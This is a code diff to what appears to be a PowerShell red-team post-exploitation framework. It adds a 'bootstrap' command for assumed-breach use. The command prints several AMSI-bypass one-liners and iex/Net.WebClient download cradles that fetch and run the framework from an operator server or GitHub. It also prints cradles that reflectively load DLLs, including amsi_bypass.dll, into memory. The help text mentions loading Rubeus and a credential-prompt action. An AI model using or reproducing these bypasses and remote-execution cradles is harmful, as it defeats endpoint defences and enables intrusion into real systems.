@@ -8,6 +8,8 @@ $_alInPS = "JLZn7QzBZS"
 $_alSpwn = "F8VN3g3UuD"
 $_alNL   = "hAdjDGYuHq"
 $_alNLLd = "wciWLtbhch"
+$_alByp  = ""
+$_alPar  = ""
 # !!AL-MAP-END!!
 $global:AmnesiacRoot = if ($PSScriptRoot) { $PSScriptRoot } elseif ($MyInvocation.MyCommand.Path) { Split-Path -Parent $MyInvocation.MyCommand.Path } else { $PWD.Path }
 
@@ -1066,6 +1068,57 @@ function Amnesiac {
 			continue
 		}
 
+		# ---- bootstrap: assumed breach AMSI bypass one-liners + load command ----
+		if ($choice -eq 'bootstrap') {
+			$_srv = if ($global:ServerURL) { $global:ServerURL -replace '/Tools/?$','' } else { 'http://<operator-IP>:8080' }
+			$_load  = "iex (New-Object Net.WebClient).DownloadString('$_srv/Amnesiac_ShellReady.ps1');Amnesiac"
+			$_b1 = Get-AmsiBypassSnippet -Technique 'fail'
+			$_b2 = Get-AmsiBypassSnippet -Technique 'session'
+			$_b3 = Get-AmsiBypassSnippet -Technique 'split'
+			$_b4 = Get-AmsiBypassSnippet -Technique 'direct'
+			# [5] reflective managed DLL -- loads AmnesiacLoader, calls Bypass.PatchAmsiReflection()
+			#     Pure .NET reflection, no AMSI scan on binary bytes loaded via [Reflection.Assembly]::Load
+			$_b5 = if ($_alByp -and $_alPar) {
+				"`$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('$_srv/$_alNs.dll'));`$_a.GetType('$_alNs.$_alByp').GetMethod('$_alPar').Invoke(`$null,`$null)"
+			} else {
+				"(run AmnesiacLoader\Build.ps1 first to populate `$_alByp/`$_alPar names)"
+			}
+			# [6] reflective native DLL: loads AmnesiacLoader then uses NativeLoader to map amsi_bypass.dll in-memory
+			$_b6 = "`$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('$_srv/$_alNs.dll'));`$_a.GetType('$_alNs.$_alNL').GetMethod('$_alNLLd').Invoke(`$null,@(,(New-Object Net.WebClient).DownloadData('$_srv/amsi_bypass.dll')))"
+			Write-Output ""
+			Write-Output " [+] Assumed Breach Bootstrap -- AMSI Bypass Options"
+			Write-Output " [*] Paste ONE bypass into the target PS process, then paste the load command."
+			Write-Output " [*] Try in order -- [1] most evasive. [6] native (no PS AMSI reflection at all)."
+			Write-Output ""
+			Write-Output " [1] Field-enum via char array (no field/type name literals anywhere):"
+			Write-Output "     $_b1"
+			Write-Output ""
+			Write-Output " [2] amsiSession null (different field, char arrays for type + field):"
+			Write-Output "     $_b2"
+			Write-Output ""
+			Write-Output " [3] String-split (concat breaks static sig -- simpler but weaker):"
+			Write-Output "     $_b3"
+			Write-Output ""
+			Write-Output " [4] Direct AmsiScanBuffer patch (no AMSI reflection, requires Add-Type):"
+			Write-Output "     $_b4"
+			Write-Output ""
+			Write-Output " [5] Managed reflection -- load AmnesiacLoader.dll, call Bypass.PatchAmsiReflection():"
+			Write-Output "     (Requires $_alNs.dll served by 'serve' or GitHub Releases)"
+			Write-Output "     $_b5"
+			Write-Output ""
+			Write-Output " [6] Native PAGE_GUARD VEH -- reflective DLL load, zero PS AMSI reflection:"
+			Write-Output "     (Requires $_alNs.dll + amsi_bypass.dll served by 'serve')"
+			Write-Output "     $_b6"
+			Write-Output ""
+			Write-Output " [*] Then load Amnesiac (operator HTTP server):"
+			Write-Output "     $_load"
+			Write-Output ""
+			Write-Output " [*] GitHub fallback (no operator server available):"
+			Write-Output "     iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Amnesiac_ShellReady.ps1');Amnesiac"
+			Write-Output ""
+			continue
+		}
+
 		if ($choice -eq 'exit') {
 			
 			for ($i = $global:listenerSessions.Count - 1; $i -ge 0; $i--) {
@@ -1933,6 +1986,7 @@ function Start-LocalShell {
             Write-Output "   TLS                Enable TLS 1.2 for this session"
             Write-Output "   RunBin <name>      Reflectively load .NET assembly from cache/server - use: RunBin Rubeus.exe triage"
             Write-Output "   serve              Start operator HTTP server (required for SharpRDP cradle delivery)"
+            Write-Output "   bootstrap          Scenario 2: show AMSI bypass options + iex load command for assumed breach"
             Write-Output ""
             Write-Output " [+] Local Actions:"
             Write-Output "   Ask4Creds          Prompt user for credentials"
